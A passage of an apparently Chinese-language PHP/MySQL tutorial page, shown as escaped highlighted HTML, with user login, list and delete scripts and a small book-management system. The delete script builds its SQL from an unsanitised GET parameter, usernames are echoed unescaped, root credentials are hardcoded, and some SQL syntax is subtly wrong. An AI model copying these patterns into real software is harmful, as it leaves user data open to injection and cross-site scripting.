    $result &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; $db&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;query&lt;/span&gt;($query);
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ($result&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;num_rows&lt;/span&gt;){
        &lt;span style=&#34;color:#66d9ef&#34;&gt;echo&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;lt;p&amp;gt;&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;lt;a href=&amp;#34;login.html&amp;#34; rel=&amp;#34;external nofollow&amp;#34; rel=&amp;#34;external nofollow&amp;#34; &amp;gt;Login successful&amp;lt;/a&amp;gt;&amp;#39;&lt;/span&gt;;
    }&lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;{
        &lt;span style=&#34;color:#66d9ef&#34;&gt;echo&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;lt;p&amp;gt;&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;lt;a href=&amp;#34;login.html&amp;#34; rel=&amp;#34;external nofollow&amp;#34; rel=&amp;#34;external nofollow&amp;#34; &amp;gt;Login failed&amp;lt;/a&amp;gt;&amp;#39;&lt;/span&gt;;
    }
&lt;span style=&#34;color:#75715e&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;e用户列表的代码&#34;&gt;e、用户列表的代码：&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# userlist.php
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;php&lt;/span&gt;
    $db &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;mysqli&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;localhost&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;root&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;admin&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;test&amp;#39;&lt;/span&gt;);
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;mysqli_connect_errno&lt;/span&gt;()){
        &lt;span style=&#34;color:#66d9ef&#34;&gt;echo&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;lt;p&amp;gt;&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Connect DB error&amp;#39;&lt;/span&gt;;
        &lt;span style=&#34;color:#66d9ef&#34;&gt;exit&lt;/span&gt;;
    }
    &lt;span style=&#34;color:#66d9ef&#34;&gt;echo&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;lt;p&amp;gt;&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;All user as follows:&amp;#39;&lt;/span&gt;;
    $query &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;select * from tbl_user order by username&amp;#34;&lt;/span&gt;;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ($result &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; $db&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;query&lt;/span&gt;($query)){
        &lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; ($row &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; $result&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;fetch_assoc&lt;/span&gt;()){
            &lt;span style=&#34;color:#66d9ef&#34;&gt;echo&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;lt;p&amp;gt;&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Username : &amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt; $row[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;username&amp;#39;&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;  &amp;lt;a href=&amp;#34;userdelete.php?username=&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt; $row[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;username&amp;#39;&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#34; rel=&amp;#34;external nofollow&amp;#34; &amp;gt;delete&amp;lt;/a&amp;gt;&amp;#39;&lt;/span&gt;;
        }
    }
&lt;span style=&#34;color:#75715e&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;e删除用户的代码&#34;&gt;e、删除用户的代码：&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# userdelete.php
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;php&lt;/span&gt;
    $username &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; $_GET[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;username&amp;#39;&lt;/span&gt;];
    $db &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;mysqli&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;localhost&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;root&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;admin&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;test&amp;#39;&lt;/span&gt;);
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;mysqli_connect_errno&lt;/span&gt;()){
        &lt;span style=&#34;color:#66d9ef&#34;&gt;echo&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;lt;p&amp;gt;&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Connect DB error&amp;#39;&lt;/span&gt;;
        &lt;span style=&#34;color:#66d9ef&#34;&gt;exit&lt;/span&gt;;
    }
    $query &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;delete from tbl_user where username = &amp;#39;&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt; $username &lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#39;&amp;#34;&lt;/span&gt;;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;echo&lt;/span&gt; $query;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ($result &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; $db&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;query&lt;/span&gt;($query)){
        &lt;span style=&#34;color:#66d9ef&#34;&gt;echo&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;lt;p&amp;gt;&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Delete user &amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt; $username &lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39; successful&amp;#39;&lt;/span&gt;;
    }&lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;{
        &lt;span style=&#34;color:#66d9ef&#34;&gt;echo&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;lt;p&amp;gt;&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Delete user &amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt; $username &lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39; failed&amp;#39;&lt;/span&gt;;
    }
    &lt;span style=&#34;color:#66d9ef&#34;&gt;echo&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;lt;p&amp;gt;&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;lt;a href=&amp;#34;userlist.php&amp;#34; rel=&amp;#34;external nofollow&amp;#34; &amp;gt;Back to user list&amp;lt;/a&amp;gt;&amp;#39;&lt;/span&gt;;
&lt;span style=&#34;color:#75715e&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;3图书管理系统&#34;&gt;3.图书管理系统&lt;/h2&gt;
&lt;h3 id=&#34;1图书添加如下页面bookaddhtml&#34;&gt;1、图书添加如下页面（bookadd.html）&lt;/h3&gt;
&lt;p&gt;&lt;figure 
	&gt;
	&lt;a href=&#34;https://ac-lm.github.io/drawingbed/img/202205051058242.png&#34; &gt;
		&lt;img src=&#34;https://ac-lm.github.io/drawingbed/img/202205051058242.png&#34;
			
			
			
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;h3 id=&#34;2建表&#34;&gt;2、建表&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-mysql&#34; data-lang=&#34;mysql&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;DROP&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;DATABASE&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;IF&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;EXISTS&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;test&amp;#39;&lt;/span&gt;;
&lt;span style=&#34;color:#66d9ef&#34;&gt;CREATE&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;DATABASE&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;IF&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;NOT&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;EXISTS&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;test&amp;#39;&lt;/span&gt;;
&lt;span style=&#34;color:#66d9ef&#34;&gt;USE&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;test&amp;#39;&lt;/span&gt;;
&lt;span style=&#34;color:#66d9ef&#34;&gt;DROP&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;TABLE&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;IF&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;EXISTS&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;tbl_book&amp;#39;&lt;/span&gt;;
&lt;span style=&#34;color:#66d9ef&#34;&gt;CREATE&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;TABLE&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;IF&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;NOT&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;EXISTS&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;tbl_book&amp;#39;&lt;/span&gt; (
    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;isbn&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;varchar&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;) &lt;span style=&#34;color:#66d9ef&#34;&gt;NOT&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;NULL&lt;/span&gt;,
    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;title&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;varchar&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;) &lt;span style=&#34;color:#66d9ef&#34;&gt;NOT&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;NULL&lt;/span&gt;,
    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;author&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;varchar&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;) &lt;span style=&#34;color:#66d9ef&#34;&gt;NOT&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;NULL&lt;/span&gt;,
    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;price&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;float&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;NOT&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;NULL&lt;/span&gt;,
    &lt;span style=&#34;color:#66d9ef&#34;&gt;PRIMARY&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;KEY&lt;/span&gt; (&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;isbn&amp;#39;&lt;/span&gt;)
) &lt;span style=&#34;color:#66d9ef&#34;&gt;ENGINE&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;InnoDB &lt;span style=&#34;color:#66d9ef&#34;&gt;DEFAULT&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;CHARSET&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;utf&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;3添加的逻辑处理代码bookadd_dophp&#34;&gt;3、添加的逻辑处理代码（bookadd_do.php）&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-PHP&#34; data-lang=&#34;PHP&#34;&gt;$db&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;query&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;set names utf-8&amp;#34;&lt;/span&gt;)
&lt;span style=&#34;color:#75715e&#34;&gt;# 注意：向数据库写入数据时，采用 utf-8 编解码，以防止中文的乱码。
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-PHP&#34; data-lang=&#34;PHP&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;php&lt;/span&gt;
    $isbn &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; $_POST[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;isbn&amp;#39;&lt;/span&gt;];
    $title &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; $_POST[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;title&amp;#39;&lt;/span&gt;];
    $author &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; $_POST[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;author&amp;#39;&lt;/span&gt;];
    $price &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; $_POST[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;price&amp;#39;&lt;/span&gt;];
    $db &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;mysqli&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;localhost&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;root&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;admin&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;test&amp;#39;&lt;/span&gt;);
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;mysqli_connect_errno&lt;/span&gt;()){
        &lt;span style=&#34;color:#66d9ef&#34;&gt;echo&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;lt;p&amp;gt;&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Connect DB error&amp;#39;&lt;/span&gt;;
        &lt;span style=&#34;color:#66d9ef&#34;&gt;exit&lt;/span&gt;;
    }
    $db&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;query&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;set names utf-8&amp;#34;&lt;/span&gt;);
    $stmt &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; $db&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;stmt_init&lt;/span&gt;();
    $stmt&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;prepare&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;insert into tbl_book values (?,?,?,?)&amp;#34;&lt;/span&gt;);
    $stmt&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;bind_param&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;sssd&amp;#34;&lt;/span&gt;, $isbn, $title, $author, $price);
    $stmt&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;execute&lt;/span&gt;();
    &lt;span style=&#34;color:#66d9ef&#34;&gt;echo&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;lt;p&amp;gt;&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Affect rows is &amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt; $stmt&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;affected_rows&lt;/span&gt;;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;echo&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;lt;p&amp;gt;&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;lt;a href=&amp;#34;booklist.php&amp;#34; rel=&amp;#34;external nofollow&amp;#34; &amp;gt;Go to book list page&amp;lt;/a&amp;gt;&amp;#39;&lt;/span&gt;;
&lt;span style=&#34;color:#75715e&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;4显示图书信息的逻辑代码&#34;&gt;4、显示图书信息的逻辑代码&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-PHP&#34; data-lang=&#34;PHP&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;php&lt;/span&gt;
    $db &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;mysqli&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;localhost&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;root&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;admin&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;test&amp;#39;&lt;/span&gt;);
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;mysqli_connect_errno&lt;/span&gt;()){
        &lt;span style=&#34;color:#66d9ef&#34;&gt;echo&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;lt;p&amp;gt;&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Connect DB error&amp;#39;&lt;/span&gt;;
        &lt;span style=&#34;color:#66d9ef&#34;&gt;exit&lt;/span&gt;;
    }
    $db&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;query&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;set names utf-8&amp;#34;&lt;/span&gt;);
    $stmt &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; $db&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;stmt_init&lt;/span&gt;();
    $stmt&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;prepare&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;select * from tbl_book&amp;#34;&lt;/span&gt;);
    $stmt&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;bind_result&lt;/span&gt;($isbn, $title, $author, $price);
    $stmt&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;execute&lt;/span&gt;();
    &lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt;($stmt&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;fetch&lt;/span&gt;()){
        &lt;span style=&#34;color:#66d9ef&#34;&gt;echo&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;ISBN : &amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt; $isbn &lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;lt;p&amp;gt;&amp;#39;&lt;/span&gt;;
        &lt;span style=&#34;color:#66d9ef&#34;&gt;echo&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Title : &amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt; $title &lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;lt;p&amp;gt;&amp;#39;&lt;/span&gt;;
        &lt;span style=&#34;color:#66d9ef&#34;&gt;echo&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Author : &amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt; $author &lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;lt;p&amp;gt;&amp;#39;&lt;/span&gt;;
        &lt;span style=&#34;color:#66d9ef&#34;&gt;echo&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Price : &amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt; $price &lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;lt;p&amp;gt;&amp;#39;&lt;/span&gt;;
        &lt;span style=&#34;color:#66d9ef&#34;&gt;echo&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;lt;p&amp;gt;&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;-----------------------------&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;lt;p&amp;gt;&amp;#39;&lt;/span&gt;;
    }
&lt;span style=&#34;color:#75715e&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
